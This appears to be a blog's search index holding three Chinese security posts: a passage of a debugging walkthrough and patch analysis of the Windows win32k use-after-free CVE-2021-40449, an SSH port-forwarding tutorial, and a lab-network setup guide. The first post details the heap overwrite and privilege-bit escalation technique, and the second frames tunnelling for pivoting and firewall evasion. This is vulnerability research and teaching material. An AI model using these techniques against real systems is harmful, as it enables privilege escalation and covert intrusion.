将调用原DC对象内的函数指针，即完成了任意内核函数调用，此时达到了use步骤。\n完整调用链如下图：\n其中漏洞相关的类定义如下，参考https://github.com/ZoloZiak/WinNT4/blob/master/private/ntos/w32/ntgdi/gre/dcobj.hxx#L97\nclass DCLEVEL { public: ... HDC hdcSave; ... } class DC : public OBJECT { public: DHPDEV dhpdev_; PDEV *ppdev_; ... HDC hdcNext_; // HDC链表指针 HDC hdcPrev_; ... DCLEVEL dclevel ... }; typedef DC *PDC; class XDCOBJ /* dco */ { public: PDC pdc; ... }; typedef XDCOBJ *PXDCOBJ; class DCOBJ : public XDCOBJ /* mdo */ { public: DCOBJ() { pdc = (PDC) NULL; } DCOBJ(HDC hdc) { vLock(hdc); } ~DCOBJ() { vUnlockNoNullSet(); } }; typedef DCOBJ *PDCOBJ; 类之间的关系可以简化为下图：\n调试 free部分 在free部分需要把我们想要释放的内存空间释放，并让后面的use部分成功申请到这块内存空间。\n调试环境：虚拟机windows 10 1607、物理机windows 10 2004\nPOC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\n断点:\nbp win32kfull!NtGdiResetDC bp win32kfull!NtGdiResetDC+0xc1 \u0026#34;调用GreResetDCInternal函数\u0026#34; bp win32kfull!GreResetDCInternal+0x3a \u0026#34;调用DCOBJ构造函数\u0026#34; bp win32kfull!GreResetDCInternal+0x116 \u0026#34;调用_imp_hdcOpenDCW函数\u0026#34; bp win32kfull!GreResetDCInternal+0x136 \u0026#34;第二次DCOBJ\u0026#34; bp win32kfull!GreResetDCInternal+0x1b5 \u0026#34;调用DC对象函数指针\u0026#34; bp win32kfull!GreResetDCInternal+0x1d1 \u0026#34;调用HmgSwapLockedHandle函数\u0026#34; bp win32kfull!GreResetDCInternal+0x20d \u0026#34;调用_imp_bDeleteDCInternal函数\u0026#34; bp cve_2021_40449!hook_DrvEnablePDEV+0x12a \u0026#34;循环调用\u0026#34; bp win32kbase!PALMEMOBJ::bCreatePalette \u0026#34;调用win32kbase!PALMEMOBJ::bCreatePalette\u0026#34; 运行POC，断点bp win32kfull!NtGdiResetDC触发此时传入的句柄为rcx=00000000092105f1\n第一次调用win32kfull!GreResetDCInternal 时传入各个参数为rcx=00000000092105f1 rdx=0000000000000000 r8=ffffb101aadf2a44 即第一个句柄值为00000000092105f1\n第一次调用构造函数，利用DC对象创建DCO对象，此时rbx存放DCO对象的地址，\n根据漏洞形成分析的计算公式，可以很方便的得到DC对象内的函数指针指向的函数的地址为：ffffd548a1f10c30\n1: kd\u0026gt; dq rax ffffb101`aadf29c0 ffffd50e`041fd010 00000000`00000001 ffffb101`aadf29d0 00000268`6e766b20 000000d7`97aff680 ffffb101`aadf29e0 00000000`00000000 00000000`092105f1 ffffb101`aadf29f0 00000000`00000000 ffffd50e`041fb030 ffffb101`aadf2a00 ffffb101`aadf2b80 ffffd548`a1f18fe6 ffffb101`aadf2a10 00000000`00000001 00000000`00000000 ffffb101`aadf2a20 ffffb101`aadf2a44 ffffd50e`041fb030 ffffb101`aadf2a30 000000d7`97aff5d0 00000000`00000000 // rbx存放了构造函数产生的DCO对象地址 1: kd\u0026gt; dq rbx ffffd50e`041fd010 00000000`092105f1 80000001`00000000 ffffd50e`041fd020 ffffd800`b45ad780 00000268`6e75ea10 ffffd50e`041fd030 00100010`00000000 00000000`00000000 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 // ffffd50e`041fd010为rbx的值，此处ffffd50e`041fd010+0x30为PDC的地址，PDC指向DC对象即DC对象地址为ffffd50e`00052030 // 计算公式 *(dco地址+0x30)=dc地址 1: kd\u0026gt; dq ffffd50e`041fd010+0x30 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 ffffd50e`041fd090 00000000`00000000 00000000`00000000 ffffd50e`041fd0a0 ffffd50e`00001a10 ffffd50e`00004cb0 ffffd50e`041fd0b0 ffffd50e`000105f0 00000000`00000000 // ffffd50e`00052030+0xad0处为DC对象的函数指针，该指针指向了一个函数 // 计算公式 *(dc地址 +0xad0)=函数地址 1: kd\u0026gt; dq ffffd50e`00052030+0xad0 ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 ffffd50e`00052b10 00000000`00000000 00000000`00000000 ffffd50e`00052b20 00000000`00000000 ffffd548`a1f10930 ffffd50e`00052b30 00000000`00000000 ffffd548`a1f11dc0 ffffd50e`00052b40 ffffd548`a1f0e6b0 ffffd548`a1f11b00 ffffd50e`00052b50 00000000`00000000 ffffd548`a1f0cd70 ffffd50e`00052b60 ffffd548`a1f0d1f0 ffffd548`a1f112f0 ffffd50e`00052b70 00000000`00000000 00000000`00000000 // 以下为函数的汇编 1: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx 之后通过hdcOpenDCW函数调用用户模式的回调函数，在回调函数中再次调用ResetDC函数，此时传入的HDC和第一次调用ResetDC的是同一个句柄。\n第二次调用win32kfull!GreResetDCInternal 时，传入同一个HDC句柄，即对应同一个DC对象。\n0: kd\u0026gt; t win32kfull!GreResetDCInternal: ffffd548`a1f03e58 488bc4 mov rax,rsp 1: kd\u0026gt; rrcx rcx=00000000092105f1 第二次调用DCOBJ构造函数时，由于传入的是同一个HDC句柄，所以HDC句柄引用次数+1，同时两次调用构造函数构造的对象关联到同一个DC对象。\n之后第二次调用win32kfull!_imp_hdcOpenDCW函数，在该函数内执行政策回调函数，win32kfull!imp_hdcOpenDCW返回一个HDC句柄值为0000000003210041，即创建了一个新的DC对象。之后通过新创建的DC对象创建DCO对象。\n在win32kfull!GreResetDCInternal后半段会调用win32kfull!_imp_HmgSwapLockedHandleContents交换第一个HDC句柄和第二次调用win32kfull!imp_hdcOpenDCW创建的HDC句柄。\n调用win32kfull!_imp_HmgSwapLockedHandleContents之后两个句柄对应的DC内容为已经发生了交换\n// 以下内容为旧DC对象，但是句柄为新句柄 1: kd\u0026gt; dq ffffd50e041fd010 ffffd50e`041fd010 00000000`03210041 80000001`00000000 ...... 1: kd\u0026gt; dq ffffd50e03fee010 // 以下内容为新DC对象，但句柄为旧句柄 ffffd50e`03fee010 00000000`092105f1 80000002`00000000 ...... 之后调用win32kfull!_imp_bDeleteDCInternal传入HDC句柄，该函数会释放HDC句柄对应的DC对象，而此时传入该函数的HDC句柄为第二次调用hdcOpenDCW函数返回的句柄，但之前交换过新旧句柄，所以实际上释放的是旧HDC句柄对应的DC对象。\n之前计算函数指针的时候，我们知道DCO +0x30是指向DC对象的指针，所以在调用win32kfull!_imp_bDeleteDCInternal函数之后，原DC对象的内存空间已经被释放，达成了use-after-free的第一步free。\nfunction pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针\n0: kd\u0026gt; dq ffffd50e041fd010+0x30 // 取DC对象地址 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ...... 0: kd\u0026gt; !pool ffffd50e`00052030 // DC对象的内存已被释放，大小为e30 Pool page ffffd50e00052030 region is Paged session pool *ffffd50e00052000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffffd50e00052e30 size: 10 previous size: e30 (Free) Free ffffd50e00052e40 size: 1c0 previous size: 10 (Allocated) Usqu 之后只需要申请这块内存空间并构造，刚删除的时候，虽然DC对象已经被释放，但函数指针还是指向正确的函数地址，接下来就要申请空间，覆盖这块内存空间的函数指针的值即可。\n0: kd\u0026gt; dq ffffd50e041fd010+0x30\t// 取DC对象地址 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 0: kd\u0026gt; dq ffffd50e`00052030+0xad0\t// 取DC对象内的函数指针 ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 0: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx use 部分 注：此部分为第二次调试，所以句柄、内存地址和前部分不一样。\n在poc里面会调用CreatePalette函数，该此函数会申请内核堆，\n第一个句柄rcx=0000000015213372\n// 第一个DCO对象 0: kd\u0026gt; dq rbx DBGHELP: SharedUserData - virtual symbol module ffff885e`847d2620 00000000`15213372 80000001`00000000 ...... // 第一个PDC 指向DC对象 0: kd\u0026gt; dq ffff885e`847d2620+0x30 ffff885e`847d2650 ffff885e`80063030 00000000`00000000 ...... // 第一个DC对象 0: kd\u0026gt; dq ffff885e`80063030 ffff885e`80063030 00000000`00000000 00000000`00000000 ffff885e`80063040 00000000`00000000 ffff885e`80046010 ffff885e`80063050 00000001`00000001 ffff885e`80063030 ffff885e`80063060 00000000`00000000 00000000`00008180 ffff885e`80063070 ffffb48d`a36b4e50 00000000`00000000 ffff885e`80063080 00000000`00000000 00000000`00000000 ffff885e`80063090 00000000`00000000 00000000`00000000 ffff885e`800630a0 00000000`00000000 00000000`00000000 第二个句柄rax=0000000001211b60\n1: kd\u0026gt; dq rdx DBGHELP: SharedUserData - virtual symbol module ffff885e`84121620 00000000`01211b60 80000001`00000000 ...... 1: kd\u0026gt; dq rdx+0x30 ffff885e`84121650 ffff885e`8006b030 00000000`00000000 ...... 1: kd\u0026gt; dq ffff885e`8006b030 ffff885e`8006b030 00000000`00000000 00000000`00000000 ffff885e`8006b040 00000000`00000000 ffff885e`80063030 ffff885e`8006b050 00000001`00000001 ffff885e`8006b030 ffff885e`8006b060 00000000`00000000 00000000`00008180 ffff885e`8006b070 ffffb48d`a317b8b0 00000000`00000000 ffff885e`8006b080 00000000`00000000 00000000`00000000 ffff885e`8006b090 00000000`00000000 00000000`00000000 ffff885e`8006b0a0 00000000`00000000 00000000`00000000 在DeleteDCInternel调用之后第一个DC对象的内存空间已经被释放\n0: kd\u0026gt; !pool ffff885e`80063030 // 注意，此时DC对象地址距离堆头地址为0x30大小 Pool page ffff885e80063030 region is Paged session pool *ffff885e80063000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffff885e80063e30 size: 70 previous size: e30 (Free) Free ffff885e80063ea0 size: b0 previous size: 70 (Free ) Usqm ffff885e80063f50 size: b0 previous size: b0 (Allocated) Usqm 根据调试，可以得知释放的DC对象内存大小为0xe30，所以要覆盖函数指针时，所申请的内存也要刚刚好或者接近这块内存大小才有可能申请到。在poc里面，使用CreatePalette申请这块内核堆。这个函数会通过系统调用进入内核函数win32kfull!NtGdiCreatePaletteInternal，该函数调用win32kbase!PALMEMOBJ::bCreatePalette创造Palette对象，win32kbase!PALMEMOBJ::bCreatePalette会调用AllocateObject为新对象申请空间，最终通过调用ExAllocatePoolWithTag函数分配堆空间，整个调用栈如下：\n0: kd\u0026gt; kb # RetAddr : Call Site 00 ffff880c`b95d39f4 : win32kbase!Win32AllocPool 01 ffff880c`b95d0042 : win32kbase!AllocateObject+0xc4 02 ffff880c`b9309ecc : win32kbase!PALMEMOBJ::bCreatePalette+0xb2 03 fffff800`b175a193 : win32kfull!NtGdiCreatePaletteInternal+0xcc 04 00007ffe`a2cb2604 : nt!KiSystemServiceCopyEnd+0x13 05 00007ff7`e44c2fe1 : win32u!NtGdiCreatePaletteInternal+0x14 06 00000000`00000d94 : cve_2021_40449!createPaletteofSize1+0xd1 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 71] ....... 2e 00007ffe`a2e9b26f : 0x000000d1`a374ef69 2f 00007ffe`a39e1a4a : gdi32full!GdiPrinterThunk+0x21f 30 00007ffe`a61889e4 : USER32!__ClientPrinterThunk+0x3a 31 00007ffe`a2cb6dc4 : ntdll!KiUserCallbackDispatcherContinue 32 00007ffe`a2e7edda : win32u!NtGdiResetDC+0x14 33 00007ffe`a3682371 : gdi32full!ResetDCWInternal+0x17a 34 00007ff7`e44c3296 : GDI32!ResetDCW+0x31 35 00000000`00000000 : cve_2021_40449!main+0x146 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 685] win32kbase!Win32AllocPool代码如下，最终是通过调用ExAllocatePoolWithTag申请堆，win32kbase!Win32AllocPool的a1参数为要申请的堆内存大小，调试过程中可以得知其要申请0xe20大小的堆，加上堆头，刚好接近刚释放的0xe3大小的堆空间大小。\n__int64 __fastcall Win32AllocPool(__int64 a1, unsigned int a2) { unsigned int v2; // ebx __int64 v3; // rdi __int64 result; // rax v2 = a2; v3 = a1; if ( (signed int)IsWin32AllocPoolImplSupported_0() \u0026lt; 0 ) result = 0i64; else result = Win32AllocPoolImpl_0(33i64, v3, v2); return result; } 同时在Poc代码分析里面分析了DC对象函数指针和堆头之间的位置关系，所以通过构造传入CreatePalette的LOGPALETTE结构可以刚刚好覆盖原DC对象内的函数指针以及该函数指针要调用的参数，内存分布具体见https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp 里面的注释。\n通过函数指针调用RtlSetAllBits函数并传入RtklBitMap型指针，其中RtlBitMap的buffer指向POC进程自身的权限位，如下图：\ntypedef struct _RTL_BITMAP { ULONG SizeOfBitMap; ULONG *Buffer; } RTL_BITMAP, *PRTL_BITMAP; 0: kd\u0026gt; dq ffff885e80063000+0x750 // 此处为RtlBitMap地址 ffff885e`80063750 ffffb48d`a3839010 ffffffff`ffffffff ffff885e`80063760 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063770 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063780 ffffffff`ffffffff ffffffff`ffffffff ffff885e`80063790 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637a0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637b0 ffffffff`ffffffff ffffffff`ffffffff ffff885e`800637c0 ffffffff`ffffffff ffffffff`ffffffff 0: kd\u0026gt; dq ffffb48d`a3839010\t// 此处存放了RtlBitMap结构，0x00-0x08为size，0x08-0x10为buffer指针，指向了自身的权限位 ffffb48d`a3839010 00000000`00000080 ffffde8f`1fb2e9d0 ffffb48d`a3839020 41414141`41414141 41414141`41414141 ffffb48d`a3839030 00000000`00000000 00000000`00000000 ffffb48d`a3839040 00000000`00000000 00000000`00000000 ffffb48d`a3839050 00000000`00000000 00000000`00000000 ffffb48d`a3839060 00000000`00000000 00000000`00000000 ffffb48d`a3839070 00000000`00000000 00000000`00000000 ffffb48d`a3839080 00000000`00000000 00000000`00000000 0: kd\u0026gt; dq ffffde8f`1fb2e9d0 ffffde8f`1fb2e9d0 00000006`02880000 00000000`00800000 ffffde8f`1fb2e9e0 00000000`00800000 00000000`00000000 ffffde8f`1fb2e9f0 00000000`00000000 00000000`00000000 ffffde8f`1fb2ea00 20010000`00000000 0000000f`00000001 ffffde8f`1fb2ea10 000001e0`00000000 00000000`00001000 ffffde8f`1fb2ea20 00000000`00000000 ffffde8f`1fb2ee18 ffffde8f`1fb2ea30 00000000`00000000 ffffde8f`1f1007f0 ffffde8f`1fb2ea40 ffffde8f`1f1007f0 ffffde8f`1f10080c 调用DC里面的函数指针之前，自身权限位为正常权限。\n调用函数指针之后，可以看到权限位全部置为了1\n补丁分析 在漏洞利用分析里面分析过漏洞形成原因是因为在调用GreResetDCInternal函数时，使用DC对象指针的时候没有检查DC对象是否异常。而利用该漏洞是通过在调用回调函数时调用ResetDC实现的。\n我们再次回顾一下漏洞函数，在调用hdcOpenDCW也就是在调用回调函数之前会通过DCO的构造函数从DC构造DCO对象，在基本概念中知道，内核对象每被引用一次则对象引用计数器值会加一。调用构造函数时，DC对象引用加一，正常情况下此时DC对象引用次数要为1。如果在回调函数中再次调用ResetDC，则会第二次调用GreResetDCInternal，再次调用DCO的构造函数，DC对象引用再次加一，此时引用次数为2。\n所以判断DC对象异常可以通过判断DC对象的引用次数实现。\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // 利用构造函数从HDC创建DCOBJ对象 v8 = v25; ·········· v10 = *(_QWORD *)(v8 + 48);\t// 赋值 *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; ······· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; ······· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// 创建新的DC对象，返回对应的HDC句柄 if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// 调用函数指针指向的函数，传入参数为用户传入的HDC对应的DC对象内的值 ······· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// 交换旧的和新的HDC对象 GreReleaseHmgrSemaphore(); ······ bDeleteDCInternal(v6, 1i64, 0i64); // 删除了hdcOpenDCW分配的HDC，但前面经过HmgSwapLockedHandleContents交换了句柄，实际删除的是旧的HDC ······ 在补丁中，增加了对DC对象引用次数进行判断的逻辑，如果在GreResetDCInternal函数中DC对象引用次数大于1则表明已经发生异常，进入异常逻辑抛出错误(因为按正常流程此处DC对象引用次数应为不应该大于1)。\n__int64 __fastcall sub_1C014CB0C(__int64 a1, __int64 a2, int *a3) { ...... int *v30; // [rsp+30h] [rbp-1h] ..... v9 = (__int64)v30; if ( !v30 ) { LABEL_6: EngSetLastError(6i64); LABEL_7: v13 = (__int64)v30; goto LABEL_8; } if ( *((_WORD *)v30 + 6) \u0026gt; 1u ) { if ( *(_DWORD *)\u0026amp;stru_1C032C3F8.Length \u0026gt; 5u \u0026amp;\u0026amp; (unsigned __int8)sub_1C00B5068(\u0026amp;stru_1C032C3F8, 0x400000000000i64) ) { v31 = \u0026amp;v25; v30 = \u0026amp;v26; v29 = \u0026amp;v28; v28 = 0x1000000i64; SysEntryGetDispatchTableValues(v10, (__int64)\u0026amp;unk_1C02F466B, v11, v12); } goto LABEL_6; } 参考链接：\nhttps://www.secrss.com/articles/35266\nhttps://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ\nhttps://bbs.pediy.com/thread-269930.htm\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/ssh-tunnel/","title":"SSH隧道","tags":[],"description":"","content":"SSH隧道 SSH提供了三种转发模式：本地端口转发、远程端口转发以及动态端口转发，本文将介绍这三种转发模式的用法。\n一些基本概念 本地主机：SSH客户端所在的主机。\n远程主机：相对于本地主机的概念，在本地主机之外的主机叫远程主机。\nSSH命令行参数解释\n-C:压缩传输，提高传输速度 -f:将ssh转入后台执行 -N:建立静默连接（连接后看不到具体会话） -g:允许远程主机连接本地用于转发的端口 -L:本地端口转发 -R:远程端口转发 本地端口转发 本地端口转发，即将本地端口转发到远程主机上，命令格式：ssh -L \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\n举例：\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d 在SSH Client运行命令ssh -CfNg -L 127.0.0.1:1313:127.0.0.1:1313 root@a.b.c.d ，将127.0.0.1:1313端口转发到SSH Server的127.0.0.1:1313端口上。此时SSH Client访问127.0.0.1:1313的结果跟访问在SSH Server端的127.0.0.1:1313结果一样。\n在SSH Client上\n此时在SSH Client上的ssh会监听127.0.0.1:1313这个端口，该端口的TCP数据通过ssh隧道传输到SSH server上。\n在SSH Server上，先监听127.0.0.1:1313端口，本文监听使用hugo 启动一个server。\n在SSH Client上使用curl 127.0.0.1:1313命令时返回的内容即为SSH Server上127.0.0.1:1313的内容\n同时本地端口转发命令中remote ip不止限制在127.0.0.1上，remote ip可以是任何一个SSH Server能够连接的host，实际上本地端口转发过程中，实际上是把SSH Server当作跳板机，连通SSH Client和SSH Server另外一端的主机，如下：\n|SSH Client| \u0026lt;-------------\u0026gt;|SSH Server| \u0026lt;--------------\u0026gt;|SSH Client不能访问但是SSH Server能访问的主机|\n本地端口转发一般应用场景为在渗透测试过程中控制了目标网络中带有SSH Server的一台机器，通过这台机器做为跳板机来访问内网其他主机上的服务。一定程度上规避防火墙的流量告警（因为ssh流量为加密流量）\n远程端口转发。 远程端口转发即和本地端口转发是相反的概念，本地端口转发是将本地端口转发到远程端口上，连接本地端口即跟连接远程端口一个效果。而远程端口转发即将远程端口转发到本地，使得连接远程端口即跟连接本地端口一样。命令格式：ssh -R \u0026lt;remote port\u0026gt;:\u0026lt;local ip\u0026gt;:\u0026lt;local port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\n举例：\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d 本次我们将SSH Client的3389端口转发到SSH Server（公网服务器）上，使得另外一台机器能够通过SSH Server的端口连接到位于局域网的SSH Client的远程桌面。\n在ssh client上运行命令\n此时任何连接SSH Server:9898的请求都会被转发到SSH Client的58989端口上，该端口监听的服务为远程桌面服务。在另外一台电脑（不同于SSH Server和SSH Client）使用远程桌面连接SSH Server:9898\n同本地端口转发一样，远程端口转发命令中的local ip可以是任何一个SSH Client能够连接的host，此时SSH Client被当作跳板机，连通SSH Client另外一端和SSH Server端的主机。\n|SSH Serve能够连通的主机| \u0026lt;--------------\u0026gt; |SSH Client| \u0026lt;--------------\u0026gt; |SSH Client能访问但是SSH Server不能访问的主机|\n远程端口转发应用场景一般是将局域网的某些服务通过SSH隧道暴露在公网上，或者在渗透测试过程中，控制了内网的某台主机，通过远程端口转发，将该主机作为跳板机来访问内网其他服务，因为此时SSH是从内网连接到外网，在流量上没有那么可疑。\n动态端口转发 在本地端口转发和远程端口转发过程中，一次性只能转发一个端口，在某些场景下效率太低了，而动态端口转发没有指定目的端口，相对于前两种来说更灵活。实际上动态端口转发即为SSH实现的SOCKS协议。命令格式:ssh -D port \u0026lt;username\u0026gt;@\u0026lt;SSH host\u0026gt;。\n在SSH Client执行命令即可在SSH Client和SSH Server之间建立socks5隧道，SSH Client可以连接该隧道来传输数据。\n组合利用 在一些情况下可以通过组合上面三种转发来达到意想不到的效果。\n例如，有两台位于互不相通的局域网主机，如果一台想要访问另外一台能够访问的服务时，可以以下面的方式达到目的\n在主机1上执行命令 ssh -CfNg -R 9898:192.168.50.1:22 root\u0026lt;SSH Server\u0026gt; 将主机1的ssh端口转发到公网服务器的9898端口。\n在主机2执行命令ssh -D 12222 -p 9898 \u0026lt;username\u0026gt;@\u0026lt;SSH Server\u0026gt; 此时ssh连接的是主机1，且建立了socks隧道，通过该隧道主机2可以方便的使用主机1能访问而主机2不能直接访问的服务。\n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/","title":"基于Vmware的小型域网络搭建","tags":[],"description":"","content":"基于Vmware的小型域网络搭建 摘要 在渗透的日常学习过程中经常需要一个内网环境，本篇文章介绍如何使用Vmware和MikroTik搭建简易的二层内网环境。\n网络结构 整个网络分为结构分为三层，第一层模拟外网环境，第二层为DMZ区域，该区域通过边界路由器的端口映射，将第二层网络主机的一些端口映射到边界路由器上对外提供服务，第三层模拟办公网，该层网络为域网络，同时可以控制第二层网络的主机。\n整个网络拓扑图如下：\nIP设置：\n第一层网络为（外网）：192.168.59.0/24\n第二层网络为（DMZ区域）：192.168.72.0/24\n第三层网络为（办公网）：172.16.2.0/24\n路由器IP地址：\n边界路由器：192.168.59.141 | 192.168.72.2\n内网路由器：192.168.72.254 | 172.16.2.254\n网络搭建 网络设置 首先使用VMware的虚拟网络编辑器增加两个网络VMnet2、VMnet3，都勾选仅主机模式，同时取消下面两个勾，如下图：\nVMnet3同理，同时在DHCP设置处设置相应的IP地址和掩码。其中外层网络为nat模式，VMnet2为DMZ区域网络，VMnet3为办公网络\n虚拟机搭建 整个网络在最少情况下一共需要六台虚拟机，分为两台ROS，四台网络中的主机。\nROS从hxxps://mikrotik.com/download下载stable版本的ova格式的镜像，之后导入到VMware中。一共需要导入两次，分别命名为ROS，ROS-1。除了下载镜像之外还需要下载winbox方便对路由器进行设置。\n网络中主机分布：\nDMZ：Ubuntu 2004、windows7\n办公网：Windows server2019、windows7\n创建上述虚拟机，并将DMZ区域的主机的网卡设置为VMnet2，办公网的主机设置为VMnet3.\n将边界路由器ROS网卡设置为net模式和VMnet2模式，内网路由器设置为VMnet2和VMnet3模式。\nIP地址及路由器设置 经历上面的步骤之后，基本的网络拓扑已经搭建完成，接下来需要对网络内的主机和路由器进行设置使得网络中的主机能够相互ping通。\n首先设置两个网络中的主机IP地址\nDMZ：\nWindows7：192.168.72.4/24 网关192.168.72.2 DNS114.114.114.114\nUbuntu ：192.168.72.3/24 网关192.168.72.2 DNS114.\n114.114.114\n办公网：\nWindows server 2019：172.16.2.4/24 网关172.16. 2.254 DNS127.0.0.1\nwindows7：172.16.2.3/24 网关172.16.2.254 DNS172.16.2.4\n至此，两个网络的主机应该可以ping通同一个网络的主机。接下来设置两个ROS的IP地址。\n打开winbox，点击Neighbors按钮，会自动嗅探网络内的存活的路由器，如下图所示。\n上图为边界路由器的IP地址，如果分配了IP地址则可以在浏览器通过IP地址浏览路由器的web界面，在如果没有分配IP地址则通过wibbox使用MAC地址登录\n进入之后，在左侧选项卡会列出路由器拥有的所有网卡接口，点击之后进入到接口详情界面，在里面会列出该接口的一些基本信息，可以通过网卡的MAC分辨该网卡对应在vmware中的网卡，将两个网卡名称分别设置为ether1-wan和ether2-lan，之后在ip-\u0026gt;addresses选项卡中将ether-lan设置为下图。ether1-wan不用设置，因为该网卡网络类型为nat会自动dhcp分配\n之后在IP-\u0026gt;Firewall-\u0026gt;NAT中新建规则，chain：srcnat，out.interface:ether2-lan,action:masquerade\n该规则将使得路由器两边的网络联通。\n参考\nhttps://www.huaweicloud.com/articles/401014315f14d0fb8d5e3f5489693621.html http://www.roszj.com/1692.html http://www.irouteros.com/?p=583\n"},{"uri":"https://www.ch35tnut.site/zh-cn/categories/","title":"Categories","tags":[],"description":"","content":""}]